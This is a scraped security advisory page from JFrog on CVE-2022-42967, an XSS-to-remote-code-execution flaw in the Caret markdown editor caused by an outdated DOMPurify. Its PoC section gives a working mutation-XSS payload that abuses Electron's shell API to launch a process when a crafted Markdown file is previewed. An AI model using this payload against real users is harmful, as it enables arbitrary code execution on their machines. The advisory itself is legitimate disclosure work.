=== Content from research.jfrog.com_cc171951_20250114_204501.html ===

[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)JFrog Security Research

* [Discover](/vulnerabilities/)
* [Follow JFrog Security
  ![twitter](/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg)](https://twitter.com/JFrogSecurity)
![Menu](/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg)![Menu](data:image/svg+xml...)![Menu](/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg)

* [Home](/)
* [Discover](/vulnerabilities/)
* [Follow JFrog Security](https://twitter.com/JFrogSecurity)
[< Back](/vulnerabilities/)
# - Caret XSS RCE

CVE-2022-42967
| CVSS 7.5

 JFrog Severity:high

Discovered By**Denys Vozniuk**of the JFrog Security Research Team

Published 10 Jan, 2023 | Last updated 10 Jan, 2023

## [Summary](#summary)

XSS in Caret markdown editor leads to remote code execution when viewing crafted Markdown files

## [Component](#component)

[Caret Editor](https://caret.io/)

## [Affected versions](#affected-versions)

All versions are affected

## [Description](#description)

This issue is caused due to insufficient validation of the document data, which is sent to the
Electron renderer.
Specifically, in the `getMarkdownHtmlElement` function in the file
`app.asar/extensions/Markdown/Markdown.js` -

`t.firstChild.innerHTML = DOMPurify.sanitize(r)`

An older version of [DOMPurify](https://github.com/cure53/DOMPurify) is used, which has known filtering bypasses (see below)

## [PoC](#poc)

Opening a document with the following contents, **when preview mode is enabled**, leads to the
immediate execution of an arbitrary process (in this case - Calculator) -

```
<form><math><mtext></form><form><mglyph><style></math><img src
onerror="try{ const {shell} = require('electron');
shell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}">

```
## [Vulnerability Mitigations](#vulnerability-mitigations)

Disable Caret's "Preview Mode"

## [References](#references)

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-42967)

[< Back](/vulnerabilities/)[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)

* [Terms of Use](https://jfrog.com/terms-of-use/)
* [Cookies Policy](https://jfrog.com/jfrog-cookies-policy/)
* [Privacy Policy](https://jfrog.com/privacy-policy/)
* Cookies Settings

Â©2025 All Rights Reserved. JFrog Ltd.


